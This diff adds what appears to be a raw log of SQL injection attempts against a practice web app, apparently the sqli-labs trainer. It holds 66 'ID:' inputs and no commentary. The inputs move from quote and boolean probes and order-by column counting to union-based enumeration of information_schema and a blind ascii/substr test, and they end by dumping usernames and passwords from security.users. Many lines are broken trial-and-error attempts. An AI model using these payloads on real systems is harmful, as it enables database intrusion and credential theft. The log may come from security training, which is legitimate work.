@@ -1,0 +1,66 @@
+ID:1
+ID:1
+ID:1'
+ID:1'union select 1,2
+ID:1' order by 1,2
+ID:1' order by 2
+ID:1
+ID:1 and 1=1
+ID:1 order by 2
+ID:1 union select table_name from information_schema.tables where table_schema=database()
+ID:1 union select table_name from information_schema.tables where table_schema=database()
+ID:1 union select column_name from information_schema.columns where table_name='Dumb'
+ID:1 union select 1,column_name from information_schema.columns where table_name="Dumb"
+ID:1 union select Dumb from Dumb
+ID:1 union select 1,2
+ID:1
+ID:1'
+ID:1 and 1=1
+ID:1 and 1=1;-- 
+ID:1 and 1=2;-- 
+ID:1 and 1=2;-- 
+ID:1' order by 1,2
+ID:1 and 1=2;-- 
+ID:1 and 12=11
+ID:1'-- 
+ID:1' and ascii(substr((length database()),1,1))>50;-- 
+ID:1' and ascii(substr((length database()),1,1))>70;-- 
+ID:1' and ascii(substr((length database()),1,1))>70;-- 
+ID:1' and ascii(substr((length database()),1,1))>50;-- 
+ID:1'-- 
+ID:1' union select 1,database();-- 
+ID:1' union select 1,database(),user();-- 
+ID:-1' union select 1,database(),user();-- 
+ID:-1' union select 1,database();-- 
+ID:-1' union select 1,database(),user();-- 
+ID:-1' union select 1,database(),database();-- 
+ID:-1' union select 1,database(),table_name from information_schema.tables where table_schema=database();-- 
+ID:-1' union select 1,table_name from information_schema.tables where table_schema=database();-- 
+ID:-1' union select 1,database(),table_name from information_schema.tables where table_schema=database();-- 
+ID:-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database();-- 
+ID:-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=users;-- 
+ID:-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name="users";-- 
+ID:-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name="users";-- 
+ID:-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name="users";-- 
+ID:-1'-- 
+ID:-1' union select 1,database(),(username,password)from users;-- 
+ID:-1' union select 1,database(),(username,password)from security.users;-- 
+ID:-1' union select 1,(username,password)from security.users;-- 
+ID:-1' union select 1,password from security.users;-- 
+ID:-1' union select 1,username from security.users,password from security.users;-- 
+ID:-1' union select 1,group_concat(username) from security.users,password from security.users;-- 
+ID:-1' union select 1,group_concat(username) from security.users,group_concat password from security.users;-- 
+ID:-1' union select 1,group_concat(username) from security.users,group_concat (password) from security.users;-- 
+ID:-1' union select 1,username from security.users,password from security.users;-- 
+ID:-1' union select 1,username from security.users where id=1,password from security.users where id=1;-- 
+ID:-1' union select 1,username from security.users where id=1;-- 
+ID:-1' union select 1,user(),username from security.users where id=1;-- 
+ID:-1' union select 1,user(),username from security.users ;-- 
+ID:-1' union select 1,user(),concat(username) from security.users ;-- 
+ID:-1' union select 1,user(),username from security.users id=2;-- 
+ID:-1' union select 1,user(),username from security.users where id=2;-- 
+ID:-1' union select 1,user(),concat("username":"password") from security.users where id=2;-- 
+ID:-1' union select 1,user(),concat("username":"password") from security.users ;-- 
+ID:-1' union select 1,user(),concat(username":"password) from security.users ;-- 
+ID:-1' union select 1,user(),concat(username,":",password) from security.users ;-- 
+ID:-1' union select 1,user(),group_concat(username,":",password) from security.users ;-- 
